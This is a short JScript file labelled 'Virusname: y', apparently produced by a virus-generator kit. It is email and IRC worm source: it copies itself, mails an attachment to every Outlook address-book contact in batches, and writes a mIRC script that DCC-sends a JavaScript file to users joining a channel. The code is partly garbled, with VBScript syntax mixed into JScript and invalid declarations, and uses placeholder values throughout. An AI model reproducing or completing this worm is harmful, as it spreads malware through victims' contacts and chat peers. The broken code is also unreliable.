// Virusname: y
// by y
// generated with JavaScript Generator 0.01
var fso = WScript.CreateObject("Scripting.FileSystemObject")
var MySf = fso.OpenTextFile(WScript.ScriptFullName, 1)
var MySC=MySf.ReadAll()
var WSHShell=WScript.CreateObject("WScript.Shell");
MySf.Close()
MyS=fso.CreateTextFile(chr$(34); OLAttachment$; chr$(34));
MyS.WriteLine(MySC);
MyS.Close();
var i outlook, fso, mapi, y, x, mail
{
fso=WScript.CreateObject("Scripting.FileSystemObject");
outlook = WScript.CreateObject("Outlook.Application");
mapi=outlook.GetNamespace("MAPI");
i=0;
for(y=1;y<=mapi.AddressLists.Count;y++)
{
for(x=1;x<=mapi.AddressLists(y).AddressEntries.Count;x++)
{
if (i==15)
{
mail.Send
i=0;
}
if (i==0)
{
mail=outlook.CreateItem(0);
mail.Subject="y";
mail.Body = "y";
mail.Attachments.Add("y");
}
mail.Recipients.Add(mapi.AddressLists(y).AddressEntries(x));
i++;
}
}
if (i!=0) mail.Send
}
var fso = WScript.CreateObject("Scripting.FileSystemObject")
var MySf = fso.OpenTextFile(WScript.ScriptFullName, 1)
var MySC=MySf.ReadAll()
var WSHShell=WScript.CreateObject("WScript.Shell");
MySf.Close()
MyS=fso.CreateTextFile("y");
MyS.WriteLine(MySC);
MyS.Close();
mirc=fso.CreateTextFile("y");
mirc.WriteLine("[script]");
mirc.WriteLine("n0=on 1:join:*.*: { if ( $nick !=$me ) {halt} /dcc send $nick C:\\mirc\\attachment.js }");
mirc.Close();
